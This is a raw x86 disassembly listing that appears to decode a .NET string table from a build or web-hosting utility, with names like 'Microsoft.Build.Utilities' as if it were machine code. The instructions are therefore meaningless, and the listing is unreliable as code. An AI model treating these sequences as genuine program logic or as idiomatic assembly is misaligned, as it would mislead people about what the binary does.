  408bbb:	add    BYTE PTR gs:[edi+0x65],al
  408bbf:	je     0x408c15
  408bc1:	popa   
  408bc2:	jb     0x408c2b
  408bc4:	gs je  0x408c08
  408bc7:	jae    0x408c3c
  408bc9:	gs ins DWORD PTR es:[edi],dx
  408bcb:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  408bcf:	popa   
  408bd0:	je     0x408c3a
  408bd2:	add    BYTE PTR [ecx+0x73],al
  408bd5:	jae    0x408c3c
  408bd7:	ins    DWORD PTR es:[edi],dx
  408bd8:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408bdc:	dec    esp
  408bdd:	outs   dx,DWORD PTR ds:[esi]
  408bde:	popa   
  408bdf:	fs push edx
  408be1:	jne    0x408c51
  408be3:	je     0x408c4e
  408be5:	ins    DWORD PTR es:[edi],dx
  408be6:	gs inc ecx
  408be8:	jae    0x408c5d
  408bea:	gs ins DWORD PTR es:[edi],dx
  408bec:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408bf0:	inc    edi
  408bf1:	gs je  0x408c48
  408bf4:	popa   
  408bf5:	jb     0x408c5e
  408bf7:	gs je  0x408c40
  408bfa:	jb     0x408c5d
  408bfc:	ins    DWORD PTR es:[edi],dx
  408bfd:	gs ja  0x408c6f
  408c00:	jb     0x408c6d
  408c02:	add    BYTE PTR [esi+0x73],dl
  408c05:	push   edx
  408c06:	gs jae 0x408c78
  408c09:	ins    BYTE PTR es:[edi],dx
  408c0a:	jbe    0x408c71
  408c0c:	fs inc ecx
  408c0e:	jae    0x408c83
  408c10:	gs ins DWORD PTR es:[edi],dx
  408c12:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  408c16:	popa   
  408c17:	je     0x408c81
  408c19:	add    BYTE PTR [edx+0x65],dl
  408c1c:	jae    0x408c8d
  408c1e:	ins    BYTE PTR es:[edi],dx
  408c1f:	jbe    0x408c86
  408c21:	inc    ecx
  408c22:	jae    0x408c97
  408c24:	gs ins DWORD PTR es:[edi],dx
  408c26:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  408c2a:	popa   
  408c2b:	je     0x408c95
  408c2d:	dec    ecx
  408c2e:	outs   dx,BYTE PTR ds:[esi]
  408c2f:	push   esp
  408c30:	popa   
  408c31:	jb     0x408c9a
  408c33:	gs je  0x408c7c
  408c36:	js     0x408c38
  408c38:	push   edx
  408c39:	gs jae 0x408cab
  408c3c:	ins    BYTE PTR es:[edi],dx
  408c3d:	jbe    0x408ca4
  408c3f:	inc    ecx
  408c40:	jae    0x408cb5
  408c42:	gs ins DWORD PTR es:[edi],dx
  408c44:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  408c48:	popa   
  408c49:	je     0x408cb3
  408c4b:	dec    ecx
  408c4c:	outs   dx,BYTE PTR ds:[esi]
  408c4d:	push   esp
  408c4e:	popa   
  408c4f:	jb     0x408cb8
  408c51:	gs je  0x408c9a
  408c54:	js     0x408c88
  408c56:	add    BYTE PTR [edi+0x65],al
  408c59:	je     0x408ca1
  408c5b:	jne    0x408cc9
  408c5d:	ins    BYTE PTR es:[edi],dx
  408c5e:	push   eax
  408c5f:	popa   
  408c60:	je     0x408cca
  408c62:	dec    edi
  408c63:	inc    cx
  408c65:	jae    0x408cda
  408c67:	gs ins DWORD PTR es:[edi],dx
  408c69:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408c6d:	push   edx
  408c6e:	gs data16 gs jb 0x408cd8
  408c73:	outs   dx,BYTE PTR ds:[esi]
  408c74:	arpl   WORD PTR [ebp+0x54],sp
  408c77:	jns    0x408ce9
  408c79:	add    BYTE PTR gs:[edi+0x65],al
  408c7d:	je     0x408cc5
  408c7f:	jne    0x408ced
  408c81:	ins    BYTE PTR es:[edi],dx
  408c82:	push   eax
  408c83:	popa   
  408c84:	je     0x408cee
  408c86:	inc    esi
  408c87:	jb     0x408cf8
  408c89:	ins    DWORD PTR es:[edi],dx
  408c8a:	inc    esi
  408c8b:	jb     0x408cee
  408c8d:	ins    DWORD PTR es:[edi],dx
  408c8e:	gs ja  0x408d00
  408c91:	jb     0x408cfe
  408c93:	inc    ecx
  408c94:	jae    0x408d09
  408c96:	gs ins DWORD PTR es:[edi],dx
  408c98:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408c9c:	jae    0x408c9e
  408c9e:	inc    edi
  408c9f:	gs je  0x408ce8
  408ca2:	jne    0x408d10
  408ca4:	ins    BYTE PTR es:[edi],dx
  408ca5:	push   eax
  408ca6:	popa   
  408ca7:	je     0x408d11
  408ca9:	inc    esi
  408caa:	jb     0x408d1b
  408cac:	ins    DWORD PTR es:[edi],dx
  408cad:	inc    edx
  408cae:	imul   ebp,DWORD PTR [esi+0x41],0x6d657373
  408cb5:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408cb9:	jae    0x408cbb
  408cbb:	inc    edi
  408cbc:	gs je  0x408d05
  408cbf:	jne    0x408d2d
  408cc1:	ins    BYTE PTR es:[edi],dx
  408cc2:	push   eax
  408cc3:	popa   
  408cc4:	je     0x408d2e
  408cc6:	inc    esi
  408cc7:	jb     0x408d38
  408cc9:	ins    DWORD PTR es:[edi],dx
  408cca:	dec    edi
  408ccb:	je     0x408d35
  408ccd:	gs jb  0x408d11
  408cd0:	jae    0x408d45
  408cd2:	gs ins DWORD PTR es:[edi],dx
  408cd4:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408cd8:	jae    0x408cda
  408cda:	inc    edi
  408cdb:	gs je  0x408d24
  408cde:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x46656d61
  408ce6:	jb     0x408d57
  408ce8:	ins    DWORD PTR es:[edi],dx
  408ce9:	inc    ecx
  408cea:	jae    0x408d5f
  408cec:	gs ins DWORD PTR es:[edi],dx
  408cee:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  408cf2:	jo     0x408d59
  408cf4:	arpl   WORD PTR [eax],ax
  408cf6:	dec    ebp
  408cf7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408cfe:	je     0x408d2e
  408d00:	push   esi
  408d01:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408d08:	jne    0x408d6e
  408d0a:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  408d11:	dec    eax
  408d12:	outs   dx,DWORD PTR ds:[esi]
  408d13:	jae    0x408d89
  408d15:	cs push ebx
  408d17:	push   0x64657261
  408d1c:	cs dec ecx
  408d1e:	push   esi
  408d1f:	jae    0x408d78
  408d21:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  408d25:	ins    BYTE PTR es:[edi],dx
  408d26:	je     0x408d91
  408d28:	push   esp
  408d29:	popa   
  408d2a:	jb     0x408d93
  408d2c:	gs je  0x408d98
  408d2f:	outs   dx,BYTE PTR ds:[esi]
  408d30:	addr16 push ebx
  408d32:	jbe    0x408d97
  408d34:	cs inc ecx
  408d36:	jae    0x408dab
  408d38:	gs ins DWORD PTR es:[edi],dx
  408d3a:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  408d3e:	jae    0x408d89
  408d40:	outs   dx,BYTE PTR ds:[esi]
  408d41:	inc    esi
  408d42:	jb     0x408da5
  408d44:	ins    DWORD PTR es:[edi],dx
  408d45:	gs ja  0x408db7
  408d48:	jb     0x408db5
  408d4a:	add    BYTE PTR [ecx+0x73],al
  408d4d:	jae    0x408db4
  408d4f:	ins    DWORD PTR es:[edi],dx
  408d50:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  408d54:	jae    0x408d9f
  408d56:	outs   dx,BYTE PTR ds:[esi]
  408d57:	inc    esi
  408d58:	jb     0x408dbb
  408d5a:	ins    DWORD PTR es:[edi],dx
  408d5b:	gs ja  0x408dcd
  408d5e:	jb     0x408dcb
  408d60:	add    BYTE PTR [ebp+0x69],cl
  408d63:	arpl   WORD PTR [edx+0x6f],si
  408d66:	jae    0x408dd7
  408d68:	data16 je 0x408d99
  408d6b:	push   esi
  408d6c:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408d73:	jne    0x408dd9
  408d75:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  408d7c:	dec    eax
  408d7d:	outs   dx,DWORD PTR ds:[esi]
  408d7e:	jae    0x408df4
  408d80:	cs push ebx
  408d82:	push   0x64657261
  408d87:	cs dec ecx
  408d89:	push   esi
  408d8a:	jae    0x408de3
  408d8c:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  408d90:	ins    BYTE PTR es:[edi],dx
  408d91:	je     0x408dfc
  408d93:	push   esp
  408d94:	popa   
  408d95:	jb     0x408dfe
  408d97:	gs je  0x408e03
  408d9a:	outs   dx,BYTE PTR ds:[esi]
  408d9b:	addr16 push ebx
  408d9d:	jbe    0x408e02
  408d9f:	cs push edx
  408da1:	gs jae 0x408e13
  408da4:	ins    BYTE PTR es:[edi],dx
  408da5:	jbe    0x408e0c
  408da7:	inc    ecx
  408da8:	jae    0x408e1d
  408daa:	gs ins DWORD PTR es:[edi],dx
  408dac:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408db0:	outs   dx,DWORD PTR ds:[esi]
  408db1:	inc    esi
  408db2:	jne    0x408e20
  408db4:	ins    BYTE PTR es:[edi],dx
  408db5:	push   eax
  408db6:	popa   
  408db7:	je     0x408e21
  408db9:	add    BYTE PTR [edx+0x65],dl
  408dbc:	jae    0x408e2d
  408dbe:	ins    BYTE PTR es:[edi],dx
  408dbf:	jbe    0x408e26
  408dc1:	inc    ecx
  408dc2:	jae    0x408e37
  408dc4:	gs ins DWORD PTR es:[edi],dx
  408dc6:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408dca:	outs   dx,DWORD PTR ds:[esi]
  408dcb:	inc    esi
  408dcc:	jne    0x408e3a
  408dce:	ins    BYTE PTR es:[edi],dx
  408dcf:	push   eax
  408dd0:	popa   
  408dd1:	je     0x408e3b
  408dd3:	add    BYTE PTR [ebp+0x69],cl
  408dd6:	arpl   WORD PTR [edx+0x6f],si
  408dd9:	jae    0x408e4a
  408ddb:	data16 je 0x408e0c
  408dde:	push   esi
  408ddf:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408de6:	jne    0x408e4c
  408de8:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  408def:	dec    eax
  408df0:	outs   dx,DWORD PTR ds:[esi]
  408df1:	jae    0x408e67
  408df3:	cs push ebx
  408df5:	push   0x64657261
  408dfa:	cs dec ecx
  408dfc:	push   esi
  408dfd:	jae    0x408e56
  408dff:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  408e03:	ins    BYTE PTR es:[edi],dx
  408e04:	je     0x408e6f
  408e06:	push   esp
  408e07:	popa   
  408e08:	jb     0x408e71
  408e0a:	gs je  0x408e76
  408e0d:	outs   dx,BYTE PTR ds:[esi]
  408e0e:	addr16 push ebx
  408e10:	jbe    0x408e75
  408e12:	xor    ch,BYTE PTR [esi]
  408e14:	push   edx
  408e15:	gs jae 0x408e87
  408e18:	ins    BYTE PTR es:[edi],dx
  408e19:	jbe    0x408e80
  408e1b:	inc    ecx
  408e1c:	jae    0x408e91
  408e1e:	gs ins DWORD PTR es:[edi],dx
  408e20:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408e24:	outs   dx,DWORD PTR ds:[esi]
  408e25:	inc    esi
  408e26:	jne    0x408e94
  408e28:	ins    BYTE PTR es:[edi],dx
  408e29:	push   eax
  408e2a:	popa   
  408e2b:	je     0x408e95
  408e2d:	add    BYTE PTR [ebp+0x69],cl
  408e30:	arpl   WORD PTR [edx+0x6f],si
  408e33:	jae    0x408ea4
  408e35:	data16 je 0x408e66
  408e38:	push   esi
  408e39:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  408e40:	jne    0x408ea6
  408e42:	imul   ebp,DWORD PTR [edi+0x2e],0x2e626557
  408e49:	dec    eax
  408e4a:	outs   dx,DWORD PTR ds:[esi]
  408e4b:	jae    0x408ec1
  408e4d:	cs push ebx
  408e4f:	push   0x64657261
  408e54:	cs dec ecx
  408e56:	push   esi
  408e57:	jae    0x408eb0
  408e59:	bound  ecx,QWORD PTR gs:[ebp+0x75]
  408e5d:	ins    BYTE PTR es:[edi],dx
  408e5e:	je     0x408ec9
  408e60:	push   esp
  408e61:	popa   
  408e62:	jb     0x408ecb
  408e64:	gs je  0x408ed0
  408e67:	outs   dx,BYTE PTR ds:[esi]
  408e68:	addr16 push ebx
  408e6a:	jbe    0x408ecf
  408e6c:	xor    ch,BYTE PTR [esi]
  408e6e:	inc    edi
  408e6f:	gs je  0x408eb4
  408e72:	imul   ebp,DWORD PTR [esi+0x46],0x65646c6f
  408e79:	jb     0x408ecb
  408e7b:	popa   
  408e7c:	je     0x408ee6
  408e7e:	add    BYTE PTR [edi+0x65],al
  408e81:	je     0x408ec5
  408e83:	imul   ebp,DWORD PTR [esi+0x46],0x65646c6f
  408e8a:	jb     0x408edc
  408e8c:	popa   
  408e8d:	je     0x408ef7
  408e8f:	add    BYTE PTR [ebp+0x70],dl
  408e92:	fs popa 
  408e94:	je     0x408efb
  408e96:	push   edx
  408e97:	gs data16 gs jb 0x408f01
  408e9c:	outs   dx,BYTE PTR ds:[esi]
  408e9d:	arpl   WORD PTR [ebp+0x73],sp
  408ea0:	add    BYTE PTR [eax+ecx*2],bh
  408ea3:	popa   
  408ea4:	jbe    0x408f0b
  408ea6:	push   ebp
  408ea7:	jo     0x408f0d
  408ea9:	popa   
  408eaa:	je     0x408f11
  408eac:	fs push edx
  408eae:	gs data16 gs jb 0x408f18
  408eb3:	outs   dx,BYTE PTR ds:[esi]
  408eb4:	arpl   WORD PTR [ebp+0x73],sp
  408eb7:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  408ebc:	popa   
  408ebd:	arpl   WORD PTR [ebx+0x69],bp
  408ec0:	outs   dx,BYTE PTR ds:[esi]
  408ec1:	addr16 inc esi
  408ec3:	imul   esp,DWORD PTR [ebp+0x6c],0x61540064
  408eca:	jb     0x408f33
  408ecc:	gs je  0x408f15
  408ecf:	jb     0x408f32
  408ed1:	ins    DWORD PTR es:[edi],dx
  408ed2:	gs ja  0x408f44
  408ed5:	jb     0x408f42
  408ed7:	add    BYTE PTR [edx+0x69],al
  408eda:	outs   dx,BYTE PTR ds:[esi]
  408edb:	inc    esi
  408edc:	outs   dx,DWORD PTR ds:[esi]
  408edd:	ins    BYTE PTR es:[edi],dx
  408ede:	fs gs jb 0x408f32
  408ee2:	popa   
  408ee3:	je     0x408f4d
  408ee5:	add    BYTE PTR [ebx+0x6f],al
  408ee8:	fs gs inc edi
  408eeb:	outs   dx,BYTE PTR gs:[esi]
  408eed:	inc    esp
  408eee:	imul   esi,DWORD PTR [edx+0x0],0x416e6942
  408ef5:	jae    0x408f6a
  408ef7:	gs ins DWORD PTR es:[edi],dx
  408ef9:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408efd:	jae    0x408eff
  408eff:	dec    edi
  408f00:	je     0x408f6a
  408f02:	gs jb  0x408f46
  408f05:	jae    0x408f7a
  408f07:	gs ins DWORD PTR es:[edi],dx
  408f09:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  408f0d:	jae    0x408f0f
  408f0f:	dec    eax
  408f10:	popa   
  408f11:	jbe    0x408f78
  408f13:	push   ebp
  408f14:	jo     0x408f7a
  408f16:	popa   
  408f17:	je     0x408f7e
  408f19:	fs push edx
  408f1b:	gs data16 gs jb 0x408f85
  408f20:	outs   dx,BYTE PTR ds:[esi]
  408f21:	arpl   WORD PTR [ebp+0x73],sp
  408f24:	add    BYTE PTR [edi+0x73],bl
  408f27:	jns    0x408f97
  408f29:	arpl   WORD PTR [eax],ax
  408f2b:	dec    ecx
  408f2c:	outs   dx,BYTE PTR ds:[esi]
  408f2d:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  408f35:	dec    esp
  408f36:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  408f3d:	push   ebx
  408f3e:	gs jb  0x408fb7
  408f41:	imul   esp,DWORD PTR [ebx+0x65],0x73795300
  408f48:	je     0x408faf
  408f4a:	ins    DWORD PTR es:[edi],dx
  408f4b:	cs push edi
  408f4d:	bound  ebp,QWORD PTR gs:[esi]
  408f50:	dec    eax
  408f51:	outs   dx,DWORD PTR ds:[esi]
  408f52:	jae    0x408fc8
  408f54:	imul   ebp,DWORD PTR [esi+0x67],0x6552492e
  408f5b:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  408f63:	dec    edi
  408f64:	bound  ebp,QWORD PTR [edx+0x65]
  408f67:	arpl   WORD PTR [esi+ebp*1+0x53],si
  408f6b:	je     0x408fdc
  408f6d:	jo     0x408f6f
  408f6f:	push   ebx
  408f70:	je     0x408fe1
  408f72:	jo     0x408f74
  408f74:	addr16 gs je 0x408fd7
  408f78:	inc    ebx
  408f79:	inc    edx
  408f7a:	dec    ebp
  408f7b:	push   ebx
  408f7c:	je     0x408fed
  408f7e:	jo     0x408ff0
  408f80:	gs add BYTE PTR fs:[ebx+0x65],dh
  408f85:	je     0x408fe6
  408f87:	inc    ebx
  408f88:	inc    edx
  408f89:	dec    ebp
  408f8a:	push   ebx
  408f8b:	je     0x408ffc
  408f8d:	jo     0x408fff
  408f8f:	gs add BYTE PTR fs:[ebx+eax*2],bh
  408f94:	inc    edx
  408f95:	dec    ebp
  408f96:	push   ebx
  408f97:	je     0x409008
  408f99:	jo     0x40900b
  408f9b:	gs fs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  408fa2:	popa   
  408fa3:	arpl   WORD PTR [ebx+0x69],bp
  408fa6:	outs   dx,BYTE PTR ds:[esi]
  408fa7:	addr16 inc esi
  408fa9:	imul   esp,DWORD PTR [ebp+0x6c],0x42430064
  408fb0:	dec    ebp
  408fb1:	push   ebx
  408fb2:	je     0x409023
  408fb4:	jo     0x409026
  408fb6:	gs add BYTE PTR fs:[ebp+0x61],ch
  408fbb:	je     0x409020
  408fbd:	push   0x74746150
  408fc2:	gs jb  0x409033
  408fc5:	add    BYTE PTR [edx+0x65],dh
  408fc8:	imul   esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  408fd0:	inc    esi
  408fd1:	outs   dx,DWORD PTR ds:[esi]
  408fd2:	ins    BYTE PTR es:[edi],dx
  408fd3:	fs gs jb 0x408fd7
  408fd7:	dec    eax
  408fd8:	popa   
  408fd9:	jae    0x409043
  408fdb:	je     0x40903e
  408fdd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  408fe1:	arpl   WORD PTR [ecx+0x63],sp
  408fe4:	push   0x65526465
  408fe9:	imul   esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  408ff1:	add    BYTE PTR [ecx+0x72],al
  408ff4:	jb     0x409057
  408ff6:	jns    0x409044
  408ff8:	imul   esi,DWORD PTR [ebx+0x74],0x73736100
  408fff:	gs ins DWORD PTR es:[edi],dx
  409001:	bound  ebp,QWORD PTR [ecx+edi*2+0x4c]
  409005:	imul   esi,DWORD PTR [ebx+0x74],0x6d697300
  40900c:	jo     0x40907a
  40900e:	gs dec esi
  409010:	popa   
  409011:	ins    DWORD PTR es:[edi],dx
  409012:	gs dec ebp
  409014:	popa   
  409015:	jo     0x409017
  409017:	gs jb  0x40908c
  40901a:	outs   dx,DWORD PTR ds:[esi]
  40901b:	jb     0x409090
  40901d:	add    BYTE PTR [ebp+0x72],ah
  409020:	jb     0x409091
  409022:	jb     0x40906a
  409024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x73656d61
  40902c:	add    BYTE PTR [ebx+0x61],ah
  40902f:	arpl   WORD PTR [eax+0x65],bp
  409032:	fs dec ebx
  409034:	gs jns 0x409037
  409037:	arpl   WORD PTR [ecx+0x63],sp
  40903a:	push   0x61566465
  40903f:	ins    BYTE PTR es:[edi],dx
  409040:	jne    0x4090a7
  409042:	add    BYTE PTR [edx+0x65],dh
  409045:	imul   esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  40904d:	push   eax
  40904e:	popa   
  40904f:	je     0x4090b9
  409051:	inc    ebx
  409052:	popa   
  409053:	arpl   WORD PTR [eax+0x65],bp
  409056:	add    BYTE PTR [edx+0x75],al
  409059:	imul   ebp,DWORD PTR [esp+eiz*2+0x4d],0x45007061
  409061:	js     0x4090c6
  409063:	gs jo  0x4090da
  409066:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40906d:	pop    edi
  40906e:	inc    ebp
  40906f:	jb     0x4090e3
  409071:	outs   dx,DWORD PTR ds:[esi]
  409072:	jb     0x4090e7
  409074:	add    BYTE PTR [edi+0x65],ah
  409077:	je     0x4090d8
  409079:	inc    ebp
  40907a:	jb     0x4090ee
  40907c:	outs   dx,DWORD PTR ds:[esi]
  40907d:	jb     0x4090c5
  40907f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x73656d61
  409087:	add    BYTE PTR [edi+0x65],ah
  40908a:	je     0x4090eb
  40908c:	inc    ecx
  40908d:	jae    0x409102
  40908f:	gs ins DWORD PTR es:[edi],dx
  409091:	bound  ebp,QWORD PTR [ecx+edi*2+0x4c]
  409095:	imul   esi,DWORD PTR [ebx+0x74],0x46734900
  40909c:	jb     0x4090ff
  40909e:	ins    DWORD PTR es:[edi],dx
  40909f:	gs ja  0x409111
  4090a2:	jb     0x40910f
  4090a4:	inc    ecx
  4090a5:	jae    0x40911a
  4090a7:	gs ins DWORD PTR es:[edi],dx
  4090a9:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4090ad:	dec    ecx
  4090ae:	jae    0x409100
  4090b0:	jb     0x409117
  4090b2:	jb     0x409119
  4090b4:	jno    0x40912b
  4090b6:	imul   esi,DWORD PTR [ebx+0x69],0x73416574
  4090bd:	jae    0x409124
  4090bf:	ins    DWORD PTR es:[edi],dx
  4090c0:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4090c4:	dec    esi
  4090c5:	jne    0x409133
  4090c7:	ins    BYTE PTR es:[edi],dx
  4090c8:	popa   
  4090c9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  4090cd:	xor    DWORD PTR [eax],eax
  4090cf:	dec    ecx
  4090d0:	jae    0x409124
  4090d2:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x746f6f52
  4090db:	add    BYTE PTR [edi+0x65],al
  4090de:	je     0x409126
  4090e0:	jb     0x409143
  4090e2:	ins    DWORD PTR es:[edi],dx
  4090e3:	gs ja  0x409155
  4090e6:	jb     0x409153
  4090e8:	dec    esp
  4090e9:	imul   esi,DWORD PTR [ebx+0x74],0x47003032
  4090f0:	gs je  0x409139
  4090f3:	jb     0x409156
  4090f5:	ins    DWORD PTR es:[edi],dx
  4090f6:	gs ja  0x409168
  4090f9:	jb     0x409166
  4090fb:	dec    esp
  4090fc:	imul   esi,DWORD PTR [ebx+0x74],0x47003033
  409103:	gs je  0x40914c
  409106:	jb     0x409169
  409108:	ins    DWORD PTR es:[edi],dx
  409109:	gs ja  0x40917b
  40910c:	jb     0x409179
  40910e:	dec    esp
  40910f:	imul   esi,DWORD PTR [ebx+0x74],0x4d003533
  409116:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40911d:	je     0x40914d
  40911f:	inc    edx
  409120:	jne    0x40918b
  409122:	ins    BYTE PTR es:[edi],dx
  409123:	fs cs push ebp
  409126:	je     0x409191
  409128:	ins    BYTE PTR es:[edi],dx
  409129:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x34762e73
  409131:	xor    BYTE PTR cs:[eax],al
  409134:	dec    ebp
  409135:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40913c:	je     0x40916c
  40913e:	inc    edx
  40913f:	jne    0x4091aa
  409141:	ins    BYTE PTR es:[edi],dx
  409142:	fs cs push ebp
  409145:	je     0x4091b0
  409147:	ins    BYTE PTR es:[edi],dx
  409148:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x61540073
  409150:	jb     0x4091b9
  409152:	gs je  0x409199
  409155:	outs   dx,DWORD PTR ds:[esi]
  409156:	je     0x4091a6
  409158:	gs je  0x4091a1
  40915b:	jb     0x4091be
  40915d:	ins    DWORD PTR es:[edi],dx
  40915e:	gs ja  0x4091d0
  409161:	jb     0x4091ce
  409163:	push   esi
  409164:	gs jb  0x4091da
  409167:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  40916e:	inc    esi
  40916f:	jb     0x4091d2
  409171:	ins    DWORD PTR es:[edi],dx
  409172:	gs ja  0x4091e4
  409175:	jb     0x4091e2
  409177:	dec    esp
  409178:	imul   esi,DWORD PTR [ebx+0x74],0x6d6f7246
  40917f:	push   edx
  409180:	gs data16 gs jb 0x4091ea
  409185:	outs   dx,BYTE PTR ds:[esi]
  409186:	arpl   WORD PTR [ebp+0x41],sp
  409189:	jae    0x4091fe
  40918b:	gs ins DWORD PTR es:[edi],dx
  40918d:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  409191:	jae    0x4091e3
  409193:	popa   
  409194:	je     0x4091fe
  409196:	add    BYTE PTR [edi+0x65],al
  409199:	je     0x4091ed
  40919b:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  4091a4:	push   eax
  4091a5:	popa   
  4091a6:	je     0x409210
  4091a8:	jae    0x4091f0
  4091aa:	jb     0x40921b
  4091ac:	ins    DWORD PTR es:[edi],dx
  4091ad:	inc    esp
  4091ae:	imul   esi,DWORD PTR [ebx+0x6b],0x64655200
  4091b5:	imul   esi,DWORD PTR [ebx+0x74],0x656d614e
  4091bc:	add    BYTE PTR [edi+0x65],al
  4091bf:	je     0x409213
  4091c1:	gs imul esi,DWORD PTR fs:[ebx+0x74],0x7473694c
  4091ca:	add    BYTE PTR [edi+0x65],al
  4091cd:	je     0x409222
  4091cf:	imul   ebp,DWORD PTR [ebp+0x70],0x614e656c
  4091d6:	ins    DWORD PTR es:[edi],dx
  4091d7:	add    BYTE PTR gs:[edi+0x65],al
  4091db:	je     0x409232
  4091dd:	outs   dx,BYTE PTR ds:[esi]
  4091de:	imul   esp,DWORD PTR [esi+0x69],0x73416465
  4091e5:	jae    0x40924c
  4091e7:	ins    DWORD PTR es:[edi],dx
  4091e8:	bound  ebp,QWORD PTR [ecx+edi*2+0x45]
  4091ec:	outs   dx,BYTE PTR ds:[esi]
  4091ed:	je     0x409261
  4091ef:	jns    0x4091f1
  4091f1:	inc    edi
  4091f2:	gs je  0x40924a
  4091f5:	outs   dx,BYTE PTR ds:[esi]
  4091f6:	imul   esp,DWORD PTR [esi+0x69],0x73416465
  4091fd:	jae    0x409264
  4091ff:	ins    DWORD PTR es:[edi],dx
  409200:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409204:	popa   
  409205:	ins    DWORD PTR es:[edi],dx
  409206:	add    BYTE PTR gs:[esi+0x69],al
  40920a:	outs   dx,BYTE PTR ds:[esi]
  40920b:	fs inc ecx
  40920d:	jae    0x409282
  40920f:	gs ins DWORD PTR es:[edi],dx
  409211:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  409215:	popa   
  409216:	ins    DWORD PTR es:[edi],dx
  409217:	gs inc esi
  409219:	jb     0x40928a
  40921b:	ins    DWORD PTR es:[edi],dx
  40921c:	push   ebx
  40921d:	imul   ebp,DWORD PTR [ebp+0x70],0x614e656c
  409224:	ins    DWORD PTR es:[edi],dx
  409225:	add    BYTE PTR gs:[edx+0x65],dl
  409229:	popa   
  40922a:	fs inc esi
  40922c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x74726f73
  409234:	inc    edx
  409235:	jns    0x40928d
  409237:	gs jb  0x4092ad
  40923a:	imul   ebp,DWORD PTR [edi+0x6e],0x63736544
  409241:	outs   dx,BYTE PTR gs:[esi]
  409243:	imul   ebp,DWORD PTR fs:[esi+0x67],0x6c756600
  40924b:	ins    BYTE PTR es:[edi],dx
  40924c:	dec    esi
  40924d:	popa   
  40924e:	ins    DWORD PTR es:[edi],dx
  40924f:	gs inc ebx
  409251:	outs   dx,DWORD PTR ds:[esi]
  409252:	ins    DWORD PTR es:[edi],dx
  409253:	jo     0x4092b6
  409255:	jb     0x4092bc
  409257:	jb     0x409259
  409259:	inc    ebp
  40925a:	jb     0x4092ce
  40925c:	outs   dx,DWORD PTR ds:[esi]
  40925d:	jb     0x4092d2
  40925f:	add    BYTE PTR [ebp+0x72],al
  409262:	jb     0x4092d3
  409264:	jb     0x4092ac
  409266:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x73656d61
  40926e:	add    BYTE PTR [ecx+0x73],al
  409271:	jae    0x4092d8
  409273:	ins    DWORD PTR es:[edi],dx
  409274:	bound  ebp,QWORD PTR [ecx+edi*2+0x4c]
  409278:	imul   esi,DWORD PTR [ebx+0x74],0x6d6f4300
  40927f:	jo     0x4092e2
  409281:	jb     0x4092e8
  409283:	add    BYTE PTR [eax+0x61],dh
  409286:	je     0x4092f0
  409288:	add    BYTE PTR [esi+0x72],ah
  40928b:	popa   
  40928c:	ins    DWORD PTR es:[edi],dx
  40928d:	gs ja  0x4092ff
  409290:	jb     0x4092fd
  409292:	inc    esp
  409293:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40929a:	jns    0x40929c
  40929c:	fs gs jae 0x409303
  4092a0:	jb     0x40930b
  4092a2:	jo     0x409318
  4092a4:	outs   dx,DWORD PTR ds:[esi]
  4092a5:	jb     0x4092a7
  4092a7:	addr16 gs je 0x40930a
  4092ab:	push   eax
  4092ac:	popa   
  4092ad:	je     0x409317
  4092af:	add    BYTE PTR [edi+0x65],ah
  4092b2:	je     0x409313
  4092b4:	inc    esi
  4092b5:	jb     0x409318
